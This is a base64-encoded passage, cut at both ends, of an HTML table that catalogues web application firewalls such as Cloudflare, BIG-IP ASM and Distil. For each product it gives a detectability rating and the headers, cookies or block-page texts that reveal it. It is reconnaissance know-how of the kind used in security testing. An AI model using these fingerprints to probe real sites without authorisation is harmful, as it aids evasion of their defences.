ICAgICAgICAgICAgPGxpPlJlc3BvbnNlIGhlYWRlcnMgY29udGFpbjo8L2xp
PgogICAgICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAg
ICAgICAgPGxpPjxjb2RlPlgtQmluYXJ5U2VjLVZpYTwvY29kZT4gZmllbGQu
PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlgtQmlu
YXJ5U2VjLU5vQ2FjaGU8L2NvZGU+IGZpZWxkLjwvbGk+CiAgICAgICAgICAg
ICAgICAgICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8L2NvZGU+IGhlYWRlciBj
b250YWlucyA8Y29kZT5CaW5hcnlTZWM8L2NvZGU+IGtleXdvcmQuPC9saT4K
ICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPC91
bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4K
ICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIEJpdE5pbmphCiAg
ICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAg
ICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwv
bGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9s
b2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAg
ICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBhZ2UgbWF5IGNvbnRh
aW46PC9saT4KICAgICAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAg
ICAgICAgICAgICAgIDxsaT48Y29kZT5TZWN1cml0eSBjaGVjayBieSBCaXRO
aW5qYTwvY29kZT4gdGV4dCBzbmlwcGV0LjwvbGk+CiAgICAgICAgICAgICAg
ICAgICAgICAgIDxsaT48Y29kZT55b3VyIElQIHdpbGwgYmUgcmVtb3ZlZCBm
cm9tIEJpdE5pbmphPC9jb2RlPi48L2xpPgogICAgICAgICAgICAgICAgICAg
ICAgICA8bGk+PGNvZGU+VmlzaXRvciBhbnRpLXJvYm90IHZhbGlkYXRpb248
L2NvZGU+IHRleHQgc25pcHBldC48L2xpPgogICAgICAgICAgICAgICAgICAg
ICAgICA8bGk+PGNvZGU+KFlvdSB3aWxsIGJlIGNoYWxsZW5nZWQgYnkgYSBy
ZUNBUFRDSEEgcGFnZSk8L2NvZGU+IHRleHQuPC9saT4KICAgICAgICAgICAg
ICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAg
ICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAg
ICAgICA8dGQ+CiAgICAgICAgICAgIEJJRy1JUCBBU00KICAgICAgICA8L3Rk
PgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAg
ICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5Nb2RlcmF0ZTwvbGk+CiAg
ICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5Ojwv
Yj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAg
ICAgIDxsaT5SZXNwb25zZSBoZWFkZXJzIG1heSBjb250YWluIDxjb2RlPkJp
Z0lQPC9jb2RlPiBvciA8Y29kZT5GNTwvY29kZT4ga2V5d29yZCB2YWx1ZS48
L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBoZWFkZXIg
ZmllbGRzIG1heSBjb250YWluIDxjb2RlPlgtV0EtSW5mbzwvY29kZT4gaGVh
ZGVyLjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPlJlc3BvbnNlIGhl
YWRlcnMgbWlnaHQgaGF2ZSBqdW1ibGVkIDxjb2RlPlgtQ25lY3Rpb248L2Nv
ZGU+IGZpZWxkIHZhbHVlLjwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgog
ICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAg
PHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgQmxvY2tEb3MKICAgICAg
ICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAg
ICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5Nb2RlcmF0ZTwv
bGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9s
b2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAg
ICAgICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8L2NvZGU+IGhlYWRlciBjb250
YWlucyB2YWx1ZSA8Y29kZT5CbG9ja0Rvcy5uZXQ8L2NvZGU+LjwvbGk+CiAg
ICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAg
IDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAg
ICAgICAgQmx1ZWRvbiBJU1QKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4K
ICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVj
dGFiaWxpdHk6IDwvYj5FYXN5PC9saT4KICAgICAgICAgICAgICAgIDxsaT48
Yj5EZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAg
ICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlNlcnZl
cjwvY29kZT4gaGVhZGVyIGNvbnRhaW5zIDxjb2RlPkJEV0FGPC9jb2RlPiBm
aWVsZCB2YWx1ZS48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaT5CbG9j
a2VkIHJlc3BvbnNlIHBhZ2UgY29udGFpbnMgdG8gPGNvZGU+Qmx1ZWRvbiBX
ZWIgQXBwbGljYXRpb24gRmlyZXdhbGw8L2NvZGU+IHRleHQgc25pcHBldC4u
PC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+
CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRk
PgogICAgICAgICAgICBCdWxsZXRQcm9vZiBTZWN1cml0eSBQcm8KICAgICAg
ICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAg
ICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5Nb2RlcmF0ZTwv
bGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9s
b2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAg
ICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBhZ2UgY29udGFpbnM6
CiAgICAgICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAg
ICAgICA8bGk+PGNvZGU+ZGl2PC9jb2RlPiB3aXRoIGlkIGFzIDxjb2RlPmJw
c01lc3NhZ2U8L2NvZGU+IHRleHQgc25pcHBldC48L2xpPgogICAgICAgICAg
ICAgICAgICAgICAgICA8bGk+PGNvZGU+SWYgeW91IGFycml2ZWQgaGVyZSBk
dWUgdG8gYSBzZWFyY2ggb3IgY2xpY2tpbmcgb24gYSBsaW5rIGNsaWNrIHlv
dXIgQnJvd3NlcidzIGJhY2sgYnV0dG9uIHRvIHJldHVybiB0byB0aGUgcHJl
dmlvdXMgcGFnZS48L2NvZGU+IHRleHQgc25pcHBldC48L2xpPgogICAgICAg
ICAgICAgICAgICAgIDwvdWw+IAogICAgICAgICAgICAgICAgPC91bD4KICAg
ICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0
cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIENETiBOUyBBcHBsaWNhdGlv
biBHYXRld2F5CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAg
ICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5
OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0
aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVs
PgogICAgICAgICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBh
Z2UgY29udGFpbnMgPGNvZGU+Q2RuTnNXQUYgQXBwbGljYXRpb24gR2F0ZXdh
eTwvY29kZT4gdGV4dCBzbmlwcGV0LjwvbGk+CiAgICAgICAgICAgICAgICA8
L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3Ry
PgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgQ2VyYmVyIChX
b3JkUHJlc3MpCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAg
ICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5
OiA8L2I+RGlmZmljdWx0PC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5E
ZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAg
ICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9u
c2UgcGFnZSBjb250YWluczoKICAgICAgICAgICAgICAgICAgICA8dWw+CiAg
ICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5XZSdyZSBzb3JyeSwg
eW91IGFyZSBub3QgYWxsb3dlZCB0byBwcm9jZWVkPC9jb2RlPiB0ZXh0IHNu
aXBwZXQuPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2Rl
PllvdXIgcmVxdWVzdCBsb29rcyBzdXNwaWNpb3VzIG9yIHNpbWlsYXIgdG8g
YXV0b21hdGVkIHJlcXVlc3RzIGZyb20gc3BhbSBwb3N0aW5nIHNvZnR3YXJl
PC9jb2RlPiB3YXJuaW5nLjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPC91
bD4gCiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgog
ICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4K
ICAgICAgICAgICAgQ2hhaXRpbiBTYWZlbGluZQogICAgICAgIDwvdGQ+CiAg
ICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8
bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkRpZmZpY3VsdDwvbGk+CiAgICAg
ICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48
L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAg
IDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBhZ2UgY29udGFpbnMgPGNvZGU+ZXZl
bnRfaWQ8L2NvZGU+IGtleXdvcmQgd2l0aGluIEhUTUwgY29tbWVudHMuPC9s
aT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAg
ICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgog
ICAgICAgICAgICBDaGluYUNhY2hlCiAgICAgICAgPC90ZD4KICAgICAgICA8
dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5E
ZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8
bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAg
ICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25z
ZSBoZWFkZXJzIGNvbnRhaW4gPGNvZGU+UG93ZXJlZC1ieS1DaGluYUNhY2hl
PC9jb2RlPiBmaWVsZC48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAg
ICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0
cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIENpc2NvIEFDRSBYTUwgR2F0
ZXdheQogICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8
dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9i
Pk1vZGVyYXRlPC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rp
b24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+
CiAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlNlcnZlcjwvY29kZT4g
aGVhZGVyIGhhcyB2YWx1ZSA8Y29kZT5BQ0UgWE1MIEdhdGV3YXk8L2NvZGU+
IHNldC48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAg
PC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAg
ICA8dGQ+CiAgICAgICAgICAgIENsb3VkYnJpYwogICAgICAgIDwvdGQ+CiAg
ICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8
bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPk1vZGVyYXRlPC9saT4KICAgICAg
ICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwv
bGk+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAg
PGxpPlJlc3BvbnNlIGNvbnRlbnQgY29udGFpbnM6PC9saT4KICAgICAgICAg
ICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48
Y29kZT5NYWxpY2lvdXMgQ29kZSBEZXRlY3RlZDwvY29kZT4gaGVhZGluZy48
L2xpPgogICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+WW91ciBy
ZXF1ZXN0IHdhcyBibG9ja2VkIGJ5IENsb3VkYnJpYzwvY29kZT4gdGV4dCBz
bmlwcGV0LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT5SZWZl
cmVuY2UgdG8gPGNvZGU+aHR0cHM6Ly9jbG91ZGJyaWMuemVuZGVzay5jb208
L2NvZGU+IFVSTC4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2Rl
PkNsb3VkYnJpYyBIZWxwIENlbnRlcjwvY29kZT4gdGV4dC48L2xpPgogICAg
ICAgICAgICAgICAgICAgICAgICA8bGk+UGFnZSB0aXRsZSBzdGFydGluZyB3
aXRoIDxjb2RlPkNsb3VkYnJpYyB8IEVSUk9SITwvY29kZT4uPC9saT4KICAg
ICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgPC91bD4K
ICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAg
IDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIENsb3VkZmxhcmUgCiAg
ICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAg
ICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwv
bGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9s
b2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAg
ICAgICAgICAgIDxsaT5SZXNwb25zZSBoZWFkZXJzIG1pZ2h0IGhhdmUgPGNv
ZGU+Y2YtcmF5PC9jb2RlPiBmaWVsZCB2YWx1ZS48L2xpPgogICAgICAgICAg
ICAgICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8L2NvZGU+IGhlYWRlciBmaWVs
ZCBoYXMgdmFsdWUgPGNvZGU+Y2xvdWRmbGFyZTwvY29kZT4uPC9saT4KICAg
ICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+U2V0LUNvb2tpZTwvY29kZT4g
cmVzcG9uc2UgaGVhZGVycyBoYXZlIDxjb2RlPl9fY2Z1aWQ9PC9jb2RlPiBj
b29raWUgZmllbGQuPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+UGFn
ZSBjb250ZW50IG1pZ2h0IGhhdmUgPGNvZGU+QXR0ZW50aW9uIFJlcXVpcmVk
ITwvY29kZT4gb3IgPGNvZGU+Q2xvdWRmbGFyZSBSYXkgSUQ6PC9jb2RlPi48
L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaT5QYWdlIGNvbnRlbnQgbWF5
IGNvbnRhaW4gPGNvZGU+RERvUyBwcm90ZWN0aW9uIGJ5IENsb3VkZmxhcmU8
L2NvZGU+YXMgdGV4dC48L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaT5Z
b3UgbWF5IGVuY291bnRlciA8Y29kZT5DTE9VREZMQVJFX0VSUk9SXzUwMFNf
Qk9YPC9jb2RlPiB1cG9uIGhpdHRpbmcgaW52YWxpZCBVUkxzLjwvbGk+CiAg
ICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAg
IDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAg
ICAgICAgQ2xvdWRmbG9vckROUwogICAgICAgIDwvdGQ+CiAgICAgICAgPHRk
PgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0
ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xpPgogICAgICAgICAgICAgICAgPGxp
PjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+U2Vy
dmVyPC9jb2RlPiBoZWFkZXIgZmllbGQgaGFzIHZhbHVlIDxjb2RlPkNsb3Vk
Zmxvb3JETlMgV0FGPC9jb2RlPi48L2xpPgogICAgICAgICAgICAgICAgICAg
IDxsaT5CbG9jay1wYWdlIHRpdGxlIG1pZ2h0IGhhdmUgPGNvZGU+Q2xvdWRm
bG9vckROUyAtIFdlYiBBcHBsaWNhdGlvbiBGaXJld2FsbCBFcnJvcjwvY29k
ZT4uPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+UGFnZSBjb250ZW50
IG1heSBjb250YWluIDxjb2RlPnd3dy5jbG91ZGZsb29yZG5zLmNvbS9jb250
YWN0PC9jb2RlPiBVUkwgYXMgYSBjb250YWN0IGxpbmsuPC9saT4KICAgICAg
ICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90
ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAg
ICBDbG91ZGZyb250CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmls
aXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0
ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNl
IGNvbnRlbnQgY29udGFpbnMgPGNvZGU+R2VuZXJhdGVkIGJ5IGNsb3VkZnJv
bnQgKENsb3VkRnJvbnQpPC9jb2RlPiBlcnJvciB1cG9uIG1hbGljaW91cyBy
ZXF1ZXN0LjwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAg
ICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAg
ICAgIDx0ZD4KICAgICAgICAgICAgQ29tb2RvIGNXYXRjaAogICAgICAgIDwv
dGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAg
ICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xpPgogICAg
ICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+
PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAg
ICA8bGk+PGNvZGU+U2VydmVyPC9jb2RlPiBoZWFkZXIgY29udGFpbnMgPGNv
ZGU+UHJvdGVjdGVkIGJ5IENPTU9ETyBXQUY8L2NvZGU+IHZhbHVlLjwvbGk+
CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAg
ICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAg
ICAgICAgICAgQ3Jhd2xQcm90ZWN0CiAgICAgICAgPC90ZD4KICAgICAgICA8
dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5E
ZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8
bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAg
ICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25z
ZSBjb29raWVzIG1pZ2h0IGNvbnRhaW4gPGNvZGU+Y3Jhd2xwcm90ZWN0PC9j
b2RlPiBjb29raWUgbmFtZS48L2xpPgogICAgICAgICAgICAgICAgICAgIDxs
aT5CbG9jayBQYWdlIHRpdGxlIGhhcyA8Y29kZT5DcmF3bFByb3RlY3Q8L2Nv
ZGU+IGtleXdvcmQgaW4gaXQuPC9saT4KICAgICAgICAgICAgICAgICAgICA8
bGk+QmxvY2tlZCByZXNwb25zZSBjb250ZW50IGNvbnRhaW5zIHZhbHVlPGJy
PiA8Y29kZT5UaGlzIHNpdGUgaXMgcHJvdGVjdGVkIGJ5IENyYXdsUHJvdGVj
dCAhISE8L2NvZGU+IHVwb24gbWFsaWNpb3VzIHJlcXVlc3QuPC9saT4KICAg
ICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAg
PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAg
ICAgICBEZW55LUFsbAogICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAg
ICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJp
bGl0eTogPC9iPkRpZmZpY3VsdDwvbGk+CiAgICAgICAgICAgICAgICA8bGk+
PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAg
ICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBj
b250ZW50IGNvbnRhaW5zIHZhbHVlIDxjb2RlPkNvbmRpdGlvbiBJbnRlcmNl
cHRlZDwvY29kZT4uPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+PGNv
ZGU+U2V0LUNvb2tpZTwvY29kZT4gaGVhZGVyIGNvbnRhaW5zIGNvb2tpZSBm
aWVsZCA8Y29kZT5zZXNzaW9uY29va2llPC9jb2RlPi48L2xpPgogICAgICAg
ICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3Rk
PgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAg
IERpc3RpbCBXZWIgUHJvdGVjdGlvbgogICAgICAgIDwvdGQ+CiAgICAgICAg
PHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+
RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xpPgogICAgICAgICAgICAgICAg
PGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAg
ICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+UmVzcG9u
c2UgaGVhZGVycyBjb250YWluIGZpZWxkIHZhbHVlIDxjb2RlPlgtRGlzdGls
LUNTPC9jb2RlPiBpbiBhbGwgcmVxdWVzdHMuPC9saT4KICAgICAgICAgICAg
ICAgICAgICA8bGk+QmxvY2tlZCByZXNwb25zZSBwYWdlIGNvbnRhaW5zOjwv
bGk+CiAgICAgICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAg
ICAgICAgICA8bGk+PGNvZGU+UGFyZG9uIE91ciBJbnRlcnJ1cHRpb24uLi48
L2NvZGU+IGhlYWRpbmcuPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAg
PGxpPjxjb2RlPllvdSBoYXZlIGRpc2FibGVkIGphdmFzY3JpcHQgaW4geW91
ciBicm93c2VyLjwvY29kZT4gdGV4dCBzbmlwcGV0LjwvbGk+CiAgICAgICAg
ICAgICAgICAgICAgICAgIDxsaT48Y29kZT5Tb21ldGhpbmcgYWJvdXQgeW91
ciBicm93c2VyIG1hZGUgdXMgdGhpbmsgdGhhdCB5b3UgYXJlIGEgYm90Ljwv
Y29kZT4gdGV4dC48L2xpPgogICAgICAgICAgICAgICAgICAgIDwvdWw+CiAg
ICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAg
IDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAg
ICAgICAgRG9TQXJyZXN0IEludGVybmV0IFNlY3VyaXR5CiAgICAgICAgPC90
ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAg
ICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAg
ICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48
L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAg
IDxsaT5SZXNwb25zZSBoZWFkZXJzIGNvbnRhaW4gZmllbGQgdmFsdWUgPGNv
ZGU+WC1ESVMtUmVxdWVzdC1JRDwvY29kZT4uPC9saT4KICAgICAgICAgICAg
ICAgICAgICA8bGk+PGNvZGU+U2VydmVyPC9jb2RlPiBoZWFkZXIgY29udGFp
bnMgPGNvZGU+RE9TYXJyZXN0PC9jb2RlPiBrZXl3b3JkLjwvbGk+CiAgICAg
ICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwv
dGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAgICAg
ICAgRG90RGVmZW5kZXIKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAg
ICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFi
aWxpdHk6IDwvYj5FYXN5PC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5E
ZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAg
ICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9u
c2UgY29udGVudCBjb250YWlucyB2YWx1ZTxicj4gPGNvZGU+ZG90RGVmZW5k
ZXIgQmxvY2tlZCBZb3VyIFJlcXVlc3Q8L2NvZGU+LjwvbGk+CiAgICAgICAg
ICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgaGVhZGVycyBjb250
YWluIDxjb2RlPlgtZG90RGVmZW5kZXItZGVuaWVkPC9jb2RlPiBmaWVsZCB2
YWx1ZS48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAg
PC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAg
ICA8dGQ+CiAgICAgICAgICAgIER5bmFtaWNXZWIgSW5qZWN0aW9uIENoZWNr
CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4K
ICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFz
eTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhv
ZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAg
ICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIGhlYWRlcnMgY29u
dGFpbiA8Y29kZT5YLTQwMy1TdGF0dXMtQnk8L2NvZGU+IGZpZWxkIHdpdGgg
dmFsdWUgPGNvZGU+ZHctaW5qLWNoZWNrPC9jb2RlPiB2YWx1ZS48L2xpPgog
ICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAg
ICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIGUzTGVhcm5pbmcgU2VjdXJpdHkKICAgICAgICA8L3RkPgogICAg
ICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxp
